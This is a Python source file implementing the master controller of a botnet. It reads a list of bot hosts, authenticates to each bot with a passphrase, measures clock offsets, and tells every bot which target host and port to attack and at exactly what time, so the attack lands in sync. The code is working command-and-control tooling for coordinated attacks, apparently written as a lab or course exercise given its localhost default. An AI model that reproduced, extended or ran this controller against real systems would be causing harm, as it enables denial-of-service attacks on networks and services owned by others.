#!/usr/bin/env python

import socket
import Util
import sys
import argparse

"""
The Master class represents the Master to control the Bots in the Botnet.
The Master reads the Bot data from bots_list.txt and communicates with the
Bots. It tells each Bot when to attack the target and at what time. It also
takes into account any time difference between itself and the Bot(s) in 
order to ensure that all Bots attack exactly at the specified time.
"""
class Master:
   def __init__(self):
      print 'Initializing Master...\n'

      # the time to attack, specifed through the delay [secs] from now
      self.atkTime = Util.getCurrTime() + (timeDelay * 1000) 
      print 'Attack will occur at:', Util.formatTimeMS(self.atkTime), '\n'

      self.targetStr = str(target[0]) + ':' + str(target[1]) 

      # list containing host names, ports and delta time for the bots
      self.bots = []

      # call the work methods
      self.readBotsFile()
      self.outputBots()
      self.connectToBots()

   """
   Read the Bot info from the bots_list.txt file.
   """
   def readBotsFile(self):
      print 'Reading Bots file...'

      with open("bots_list.txt") as botsFile:
         for line in botsFile:
            host, sep, port = line.partition(":")
            self.bots.append([host.strip(), int(port.strip()), int(0)])

   """
   Output the list of Bots
   """
   def outputBots(self):
      print '\nCurrent Bots (host:port):'
      
      for i, bot in enumerate(self.bots):
         print "%s:%d" % (bot[0], bot[1])
      print ''

   """
   Connect to each Bot, get the time difference, tell the Bot who to attack
   and when to attack.
   """
   def connectToBots(self):
      for i, bot in enumerate(self.bots):
         print 'Connecting to Bot @ %s:%d...' % (bot[0], bot[1])
         botSocket = socket.socket()

         try:
            botSocket.connect((bot[0], bot[1]))
         except socket.error:
            print 'Unable to connect. Skipping bot.\n'
            continue

         print 'Connected'

         # perform handstake
         Util.send(botSocket, Util.MASTER_PASSPHRASE)
         recvdPassphrase = Util.recieve(botSocket)
         if recvdPassphrase != Util.BOT_PASSPHRASE:
            print 'Bot @ ' + '%s:%d' % (bot[0], bot[1]) + ' compromised!'
            botSocket.close()
            continue

         # get the bot's time
         Util.send(botSocket, Util.CODE_00)
         botTime = Util.recieve(botSocket)

         # determine time difference
         myTime = int(Util.getCurrTime())
         botTime = int(botTime.strip())
         delta = botTime - myTime

         print 'Current time: ' + Util.formatTimeMS(myTime)
         print 'Bot time: ' + Util.formatTimeMS(botTime)
         print 'Time difference [ms]: ' + str(delta)

         # tell the bot the target 
         # if we do not add the delta, then we would notice that some
         # bots attack a little early or late depending on their offset
         # delta = 0
         Util.send(botSocket, self.targetStr + '@' + \
            str(int(self.atkTime + delta)))

         print 'Bot @ ' + '%s:%d' % (bot[0], bot[1]) + ' is ready to attack!\n'

         botSocket.close()

if __name__ == '__main__':
   # handle arguments
   parser = argparse.ArgumentParser(description='Start Master.')

   parser.add_argument('-t', '--target', dest='target', action='store', \
      required=False, default=str(socket.gethostname()), \
      help='The target host. Default is localhost.')

   parser.add_argument('-p', '--port', dest='port', action='store', \
      type=int, required=False, default=8080, \
      help='The target host\'s port. Default is 8080.')

   parser.add_argument('-d', '--time', dest='time', action='store', \
      type=int, required=False, default=10, \
      help='Attack time, as the number of seconds from now. \
      Default is 10 seconds. ')

   args = parser.parse_args()
   port = args.port
   timeDelay = args.time

   # invalid port or time
   if port <= 1024 or timeDelay <= 0:
      parser.print_help()
      sys.exit(0)

   target = (args.target, port)

   master = Master()
